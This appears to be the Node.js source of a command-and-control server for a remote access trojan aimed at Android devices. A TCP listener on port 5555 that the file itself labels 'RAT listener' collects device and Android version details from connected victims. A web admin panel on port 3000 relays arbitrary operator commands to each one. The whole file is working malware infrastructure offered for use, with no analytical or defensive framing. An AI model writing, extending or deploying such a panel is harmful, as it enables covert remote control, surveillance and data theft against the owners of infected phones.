const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const net = require('net');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(express.static('public'));

// TCP server for RAT clients
const tcpServer = net.createServer((socket) => {
    const clientId = Date.now();
    const client = {
        id: clientId,
        socket: socket,
        info: {},
        buffer: ''
    };

    clients.set(clientId, client);
    io.emit('client_connected', clientId);

    socket.on('data', (data) => {
        const lines = data.toString().split('\n');
        lines.forEach(line => {
            if (line.trim()) {
                handleClientMessage(clientId, line.trim());
            }
        });
    });

    socket.on('end', () => {
        clients.delete(clientId);
        io.emit('client_disconnected', clientId);
    });
});

tcpServer.listen(5555, () => {
    console.log('[TCP] RAT listener on port 5555');
});

const clients = new Map();

function handleClientMessage(id, msg) {
    const client = clients.get(id);
    if (!client) return;

    if (msg.startsWith('DEVICE:')) {
        client.info.device = msg.substring(7);
        io.emit('client_info', { id, info: client.info });
        return;
    }
    if (msg.startsWith('ANDROID:')) {
        client.info.android = msg.substring(8);
        io.emit('client_info', { id, info: client.info });
        return;
    }

    // forward to admin UI
    io.emit('client_data', { id, data: msg });
}

function sendCommand(clientId, command) {
    const client = clients.get(clientId);
    if (client) {
        client.socket.write(command + '\n');
    }
}

// Admin commands via socket.io
io.on('connection', (adminSocket) => {
    console.log('[Web] Admin connected');

    // send current client list
    const list = Array.from(clients.keys()).map(id => ({
        id,
        info: clients.get(id).info
    }));
    adminSocket.emit('client_list', list);

    adminSocket.on('command', ({ clientId, cmd }) => {
        sendCommand(clientId, cmd);
    });
});

server.listen(3000, () => {
    console.log('[Web] Admin panel on http://localhost:3000');
});